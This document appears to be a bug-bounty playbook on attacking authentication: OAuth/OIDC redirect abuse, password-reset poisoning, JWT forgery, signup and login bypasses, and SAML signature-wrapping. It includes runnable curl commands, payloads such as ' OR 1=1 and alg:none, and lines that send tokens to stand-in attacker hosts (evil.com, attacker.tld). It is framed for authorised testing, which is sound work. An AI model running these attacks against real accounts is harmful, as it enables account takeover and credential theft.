# Moraa — Auth, OAuth/OIDC, SAML SSO, ATO, password-reset, signup/login flows

> Load when hunting authentication. ATO is the highest-value web bug. Two accounts always. Deep ref:
> `knowledge/*/offensive-oauth`, `offensive-jwt`. JWT specifics: `sqli.md`/`framework-misconfig.md §8`.
> Also owns: § SAML SSO attacks (federation ATO) and the deep password-reset battery (§ Password reset).

## OAuth / OIDC (redirect + token theft = ATO)
```
Test the authorize + callback:
- redirect_uri: exact-match? try  //evil.com  https://evil.com  https://TRUSTED.evil.com
  path append  https://app/cb/../../evil  open-redirect-on-trusted-host as redirect_uri (chain!)
  parameter pollution redirect_uri=good&redirect_uri=evil   ;  &redirect_uri=good%252f..%252f
- response_type: implicit still on? token in URL fragment → leak via redirect/referrer.
- state: missing/not-validated → CSRF the OAuth flow (login CSRF / account link takeover).
- PKCE: downgrade (drop code_challenge) accepted? code_verifier unchecked?
- scope: request extra scopes; consent skipped for already-authorized client?
- code: reuse (should be one-time), cross-client swap, code from client A used at client B.
- prompt=none / SSO auto-approve → silent code issuance to attacker redirect.
- IdP-config SSRF: attacker-controlled issuer/jwks_uri/metadata_url → sign own tokens (see ssrf.md).
```
Classic ATO chain: **open redirect on a trusted subdomain used as `redirect_uri` → victim's `code`/
token lands on attacker page → exchange → full ATO.** Hunt open redirect *because* of this (see
`open-redirect.md`).

### Dynamic Client Registration (RFC 7591) — self-register a client, plant your redirect_uri
Modern OAuth deployments (MCP servers, AI-agent platforms, developer portals) expose DCR so agents
can self-register. If the registration endpoint is unauthenticated and accepts an arbitrary
`redirect_uri`, you can build an authorization URL that delivers a victim's `code` to your host:
```bash
curl -s https://T/.well-known/oauth-authorization-server | jq '.registration_endpoint,.authorization_endpoint'
curl -s -X POST https://T/register -H 'Content-Type: application/json' \
  -d '{"client_name":"poc","redirect_uris":["https://attacker.tld/cb"],"grant_types":["authorization_code"]}'
```
A `client_id` back from an unauthenticated POST, with your arbitrary redirect_uri accepted, means
you can build that authorize URL → victim consents → code lands on `attacker.tld/cb` → exchange →
ATO. Full MCP-specific chain (shared downstream client_id, state binding, consent-cookie planting):
`mcp-security.md` Technique 5. Honest gate: **PKCE + per-user consent + exact-match redirect_uri
each individually kill this** — confirm which of the three are absent before reporting.

## Device-trust cookie leaked via API response → device impersonation
(ysamm.com "steal-dtsg-cookie", FB, Jan 2026). Long-lived device-trust cookie (`datr`,
`SameSite=None`) decides "trusted device" during account recovery → skip password+2FA.
```
Its VALUE was echoed back as a machine_id body field in an OAuth code-exchange API response.
- leak it: batch-API (several API calls chained in one request — common on large platforms)
  propagates the echoed value into attacker-readable output (there: a Page post the attacker reads).
- deliver it: SameSite=None → attacker's invisible cross-site iframe triggers the flow (0-click).
- cash it: inject the stolen datr into a FRESH browser session → treated as the victim's
  trusted device → account recovery skips password+2FA → ATO.
```

**Lesson: any API response (especially one reachable via a batch/multi-call API that chains several
operations in one request) that echoes the VALUE of a long-lived device-trust or session-trust
cookie as a body field is a device-impersonation leak — the cookie's own SameSite policy doesn't
protect it once its value is readable via a different, attacker-reachable response. Check every
OAuth/device-linking/recovery-flow response body for cookie values being echoed as ordinary-looking
fields (`machine_id`, `device_id`, client_id-shaped names are common disguises).**

## Confused-deputy via a trusted first-party analytics/tracking script
(ysamm.com "leaking-fbevents-ato", FB, Jan 2026). `fbevents.js` = FB's pixel, embedded on millions
of 3rd-party sites; postMessage listener trusts ANY message whose `event.origin` is
facebook.com/* — payload never validated. On trigger it makes an authenticated Graph API call
using the ATTACKER-SUPPLIED token from the message (not its own credentials), embedding
`location.href`/`document.referrer` of the page it runs on.
```
Chain (no OOB callback infrastructure needed at all):
- victim's OAuth code leaked into a page URL via an unrelated error-page bug.
- lure victim to any page running fbevents.js (trivial — it's on countless sites).
- postMessage it with YOUR OWN access token → fbevents.js calls Graph API AS THE ATTACKER,
  embedding the victim's current page URL (carrying their leaked code) as a parameter.
- the sensitive URL/code lands in the ATTACKER's own API request history/logs → read it there.
```

**Lesson: a widely-embedded first-party script (analytics, tracking pixels, SDKs) that listens for
postMessage and reacts by making its OWN authenticated API calls is a confused-deputy vector if
(a) it accepts an attacker-supplied credential/token in the message rather than only using its own,
and/or (b) it embeds ambient page context (URL, referrer, cookies) into that API call. The attacker
doesn't need an OOB callback — the leak lands in the attacker's own request logs because the call
is made WITH the attacker's own credentials, just carrying victim-page context as a side effect.**
Trigger is postMessage (see `postmessage.md`), but the confused-deputy API-call behavior is why it
belongs here too.

## Account linking / social login
- Link attacker's Google to victim's account (email match without verification) → login as victim.
- Pre-account-takeover: register victim's email (unverified) before they sign up via SSO; they link to your account.
- Email-not-verified → SSO trusts `email` claim → login as anyone with a controllable IdP `email`.

## JWT (quick)
```
alg:none / alg:None / alg:nOnE       RS256→HS256 confusion (sign HS256 with the public key as secret)
weak HS256 secret → hashcat -m 16500 jwt.txt wordlist   kid: path-traversal / SQLi / point to /dev/null
jku/x5u/jwk header → attacker-hosted key   ;  expired/nbf not enforced ; sig not verified at all
```

## Password reset (forgot-password) scenarios
```
- Host-header poisoning: reset link built from Host/X-Forwarded-Host → set to attacker → token leaks to you.
    curl -X POST https://T/forgot -d 'email=victim' -H 'Host: evil.com'  → link points to evil.com
    also X-Forwarded-Host / X-Forwarded-Server / X-Host / Referer-based.
- Token weakness: predictable (timestamp/seq), short, no expiry, reusable, not invalidated after use/login.
- IDOR/response leak: reset response body/JSON contains the token or a userId you can swap.
- Token not bound to user: request reset for attacker, submit with victim's email/userId.
- Race: request many tokens; older ones still valid.
- 0-click via password-reset + open redirect / referrer leak of token in URL.
- Reset doesn't invalidate active sessions / MFA → partial.
- "Change email" without step-up + then reset → ATO (acme.example step-up lesson: check which fields skip L2).
```

### The deep battery (9 tests)

Cross-ref [[host-header]] (reset-link poisoning), [[idor-access-control]] (reset-by-changing-user-id),
[[rate-limit-bypass]], [[2fa-bypass]].

| # | Test | Win condition |
|---|---|---|
| 1 | **Username enumeration** | Invalid email vs. a real one — different response body/status/length = enumerable |
| 2 | **Token in the response body itself** | Submit forgot-password, inspect the JSON/HTML response — token/link/code should NEVER appear there, only in the email |
| 3 | **Token replay after use** | Complete a full reset cycle, then resubmit the SAME token — a second `200`/"success" means it wasn't invalidated |
| 4 | **Missing rate limit** | 10-20 rapid requests to the endpoint — all succeed with no 429/lockout/CAPTCHA |
| 5 | **Token predictability** | Is it `base64(email+timestamp)`? A 4-6 digit numeric code brute-forceable in the token's validity window? |
| 6 | **Not bound to session/IP** | Generate the link, use it from a different browser/IP with no original session — still works? |
| 7 | **Referrer leak** | Reset page loads a third-party resource (analytics/CDN/ads) — does the token appear in the outbound `Referer` header to that third party? |
| 8 | **IDOR on reset** | Change the target user id/email in the reset request body — reset SOMEONE ELSE'S password |
| 9 | **No expiration** | Generate a token, wait 24h+, use it — should have expired in 15-60 min |

`Content-Type` note: HTML forms usually want `application/x-www-form-urlencoded`; REST APIs want `application/json` — try both if one 415s.

### Runnable checks (commands for the battery)

```bash
H="https://TARGET"; CT="Content-Type: application/json"
OWN="you@your-own-account.test"      # your account on the target — own accounts only

# 1 — username enumeration: diff status+size+timing for real vs invented email
curl -s -o /dev/null -w 'real  %{http_code} %{size_download} %{time_total}s\n' \
     -X POST "$H/api/password-reset" -H "$CT" -d "{\"email\":\"$OWN\"}"
curl -s -o /dev/null -w 'fake  %{http_code} %{size_download} %{time_total}s\n' \
     -X POST "$H/api/password-reset" -H "$CT" -d '{"email":"no-such-user@target.com"}'

# 2 — token in the response body itself (should NEVER be there — it belongs in the email)
curl -s -X POST "$H/api/password-reset" -H "$CT" -d "{\"email\":\"$OWN\"}" \
     | grep -iE 'token|code|link|reset'

# 3 — token replay after use: full cycle, then resubmit the SAME token
curl -s -o /dev/null -w 'first  %{http_code}\n' -X POST "$H/api/password-reset/confirm" \
     -H "$CT" -d '{"token":"<tok>","password":"<new>"}'
curl -s -o /dev/null -w 'replay %{http_code}\n' -X POST "$H/api/password-reset/confirm" \
     -H "$CT" -d '{"token":"<same-tok>","password":"<new2>"}'   # second 200 = not invalidated

# 4 — rate limit: 15 rapid requests, watch for any 429/lockout/captcha
for i in $(seq 1 15); do curl -s -o /dev/null -w '%{http_code} ' \
  -X POST "$H/api/password-reset" -H "$CT" -d "{\"email\":\"$OWN\"}"; done; echo

# 5 — predictability: collect 3+ tokens, compare structure (base64? timestamp delta? numeric?)
for i in 1 2 3; do curl -s -X POST "$H/api/password-reset" -H "$CT" \
  -d "{\"email\":\"$OWN\"}" | grep -ioE '[A-Za-z0-9_-]{8,}'; sleep 2; done

# 6 — not bound to session/IP: use the link from a different IP/no cookies (curl already is)
curl -s -o /dev/null -w 'clean-ip %{http_code}\n' -X POST "$H/api/password-reset/confirm" \
     -H "$CT" -d '{"token":"<tok>","password":"<new>"}'

# 8 — IDOR on reset: swap the user id/email in the confirm body for your OTHER test account
curl -s -X POST "$H/api/password-reset/confirm" -H "$CT" \
     -d '{"token":"<tok>","userId":<OTHER-account-id>,"password":"<new>"}' | jq .

# 9 — no expiration: save a token, re-test >24h later (validity should be 15-60 min)
echo "<tok> $(date -Is)" >> /tmp/reset-tokens.txt
```

**Impact gate:** enumeration wins only on a repeatable, non-timing-only diff (body/status/length);
token flaws count only with a full ATO demo on your OWN account (guessed/leaked/replayed token →
set a new password and log in). "Token expires after 24h" with no other flaw is a shrug.

### Chain it
Any single win here plus [[host-header]] Phase 1 (reset-link host poisoning) or a leaked/predictable
token = full account takeover, no password needed. Report the complete chain, not just the isolated gap.

## Signup / registration scenarios
```
- Email verification bypass: set is_verified/emailVerified in signup body (mass-assignment);
  skip the verify step and log in; verify-token predictable/leaked.
- Duplicate/normalized email: Victim@x vs victim@x, victim+@x, unicode/homoglyph, trailing dot,
  victim@x vs victim@x. (register a colliding identity → merge/overwrite victim).
- Role/tenant injection at signup: {"role":"admin"} / {"orgId":"<victim-org>"} / isAdmin=true.
- Auto-join by email domain: sign up as anything@victimcorp.com → auto-added to victim's org/tenant.
- Overwrite existing account via signup (upsert) using victim's email.
```

### Unicode-normalization identity collision — the "unicode/homoglyph" line above, as a real test
When one flow (signup/lookup) stores the RAW identifier but another flow (password reset, SSO
account-link, login) matches a NORMALIZED one → duplicate accounts, reset-token misdelivery, or
zero-interaction ATO. Classic case: the Turkish dotless i — `mıke@example.org` (U+0131)
uppercases/normalizes to `MIKE@example.org` → `mike@example.org`, which is how GitHub's password
reset delivered tokens to the wrong address. First, see what normalization does to your identifier:
```python
python3 - <<'EOF'
import unicodedata
ident = "victim@example.com"
for form in ("NFC","NFD","NFKC","NFKD"):
    print(form, unicodedata.normalize(form, ident))
print("casefold", ident.casefold(), "upper->lower", ident.upper().lower())
EOF
```
Canary characters to substitute one at a time: `ı` (U+0131 dotless i), `İ` (U+0130), `K` (U+212A
Kelvin sign → `k`), fullwidth forms (`ａ` U+FF41 … `＠` U+FF20), `ﬁ`/`ﬀ` ligatures, superscripts,
soft hyphen U+00AD, and combining marks. Method: register an account with the unicode variant,
then run EVERY identity flow (login, password reset, SSO link, invite, team-membership lookup,
email-change) with BOTH spellings and diff which one the server resolves. The finding is the
FLOW-TO-FLOW disagreement, not that the characters normalize. (Same root cause as the WAF-unicode
bypass in `bypass-4xx.md`, pointed at identity instead of payloads.)
Reference: https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n
Reference: https://hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html

## Login / session scenarios
```
- Auth bypass: SQLi/NoSQLi in login (' OR 1=1 / [$ne]); response-based (change false→true in JSON).
- 2FA/MFA bypass: skip the OTP step (go straight to post-2FA endpoint), reuse/omit the "mfa_passed"
  flag, brute OTP (no rate limit / no lockout), backup-code IDOR, response manipulation, race.
- Session: fixation (session id not rotated on login), non-expiring/predictable tokens, token in URL,
  cookie scope Domain=.parent (blast radius), SameSite=None (cross-site), JWT not revoked on logout.
- Remember-me / long-lived token weak; concurrent-session not killed on password change.
- Rate-limit bypass on login: rotate X-Forwarded-For, case/whitespace in username, IPv6, null byte.
- Cross-domain SSO cookie honored by unrelated backend (acme.example lesson: one session reached many APIs).
```

## Step-up / re-auth gaps (our proven Medium)
```
For "sensitive" self-service actions gated by password re-entry / L2:
- enumerate EVERY field of the profile/settings PUT; find security fields that DON'T trigger step-up
  (recovery phone, MFA-reset toggle, passwordless flag, anomaly-detection toggle) → downgrade primitive.
- per-field allowlist gates are the bug: 9 fields gated, the 10th missed.  (acme.example sso.acme.example finding)
```

## Method
Two accounts (A/B) from `auth.json`. For every auth action: try to do it *for another user*, *skip a
step*, *reuse/forge a token*, *poison a header*. → `validate.md` → `findings/` with the exact request
chain (redirect URL, leaked token location, before/after). Rate ATO with any precondition (SameSite,
needs-XSS) stated honestly.

---

## SAML SSO attacks (SSO/IdP → ATO)

> HackTricks `saml-attacks`. Directly applicable to any enterprise SSO/MSP IdP-bind flow — we have an
> OPEN, blocked-not-tested lead exactly on this pattern (mesh.svc IdP config, SAML metadataUrl SSRF
> suspected but disproven for THAT vector — XSW/signature-stripping was never tried). Cross-ref
> [[xxe]] (SAML responses are XML), [[ssrf]] (metadataUrl fetch). Same ATO decision as the OAuth
> flows above — the federation sibling.

### Where to find it
Enterprise/B2B SSO login (`Login with SSO`, "Configure your IdP"), MSP/org federation binds, any
`/saml/`, `/sso/`, `ACS` (Assertion Consumer Service), `metadata.xml` endpoint. Capture the raw SAML
Response: it's base64+deflate-encoded XML in a POST body or URL param — decode it first.
```bash
echo "$SAMLResponse" | base64 -d | python3 -c "import sys,zlib;print(zlib.decompress(sys.stdin.buffer.read(),-15))" 2>/dev/null || echo "$SAMLResponse"|base64 -d
```

### The battery (Burp **SAML Raider** extension does most of this for you)
| # | Attack | How |
|---|---|---|
| 1 | **Signature stripping** | remove the `<Signature>` element entirely, replay | fail-open SP that doesn't enforce a signature |
| 2 | **XML Signature Wrapping (XSW)** | duplicate the `<Assertion>`, put your forged one in a new position (before/after/nested) while leaving the ORIGINAL signed assertion elsewhere in the document — the signature validator finds and verifies the original, but the application logic reads the forged one. 8 documented variants (XSW1-8, differ in where the copy/wrap goes) — SAML Raider "XSW" tab tries all of them | validator and consumer disagree on which node is "the" assertion |
| 3 | **Self-signed certificate swap** | export the IdP's cert from the response, "Save and Self-Sign" in SAML Raider, re-sign your forged assertion with YOUR key, replay | SP doesn't pin/verify the cert is from the trusted CA/IdP — accepts anything cryptographically well-formed |
| 4 | **Comment injection in NameID** | `<NameID>admin@corp.com<!---->.evil</NameID>` — some XML/regex-based post-processing truncates at the comment, some downstream consumers don't | inconsistent parsing between the signature-verified value and the value the app actually uses |
| 5 | **XXE via SAML** | the decoded XML is parsed like any XML doc — inject a DOCTYPE/external entity ([[xxe]]) | SAML parser doesn't disable external entities |
| 6 | **Recipient / Audience confusion (federation confusion)** | get a valid assertion issued for SP-A, replay it against SP-B that trusts the SAME IdP; also test with the `Recipient`/`Audience` field stripped or mismatched | SP doesn't validate the assertion was actually addressed to it → cross-SP account confusion, log in as SP-A's user on SP-B |
| 7 | **Replay** | reuse a captured assertion after its `NotOnOrAfter` expiry, or a second time (no `InResponseTo`/one-time nonce tracking) | no replay protection |
| 8 | **metadataUrl / IdP-config SSRF** | if the SP lets an admin CONFIGURE the IdP by URL (`metadataUrl`, `entityId` fetch), that URL fetch is itself SSRF-able ([[ssrf]]) — test internal IPs/collaborator on the config-time fetch, separately from the runtime assertion flow |
| 9 | **NameID spoofing via IdP-initiated flow** | if the SP accepts IdP-initiated SSO (no prior AuthnRequest), and you control ANY IdP the SP trusts (a self-service/multi-tenant IdP registration), mint an assertion for an arbitrary NameID |

### Practical flow
1. Capture a legit SAML Response for your own low-priv account.
2. Try #1 (strip signature) first — cheapest test, some SPs still fail open.
3. Run SAML Raider's XSW suite with `NameID` changed to a target (`admin@target.com`, or another
   tenant's user) — a hit is a clean ATO / cross-tenant takeover.
4. If the app lets you configure the IdP (MSP/org bind), separately test that config-time fetch as SSRF.

### Report
Show the exact modified assertion, the identity it forged, and the response proving the SP
authenticated as that identity (a `Set-Cookie`/redirect to a privileged dashboard). SSO ATO via SAML
is routinely Critical — it's a full auth bypass into any account the forged NameID names.
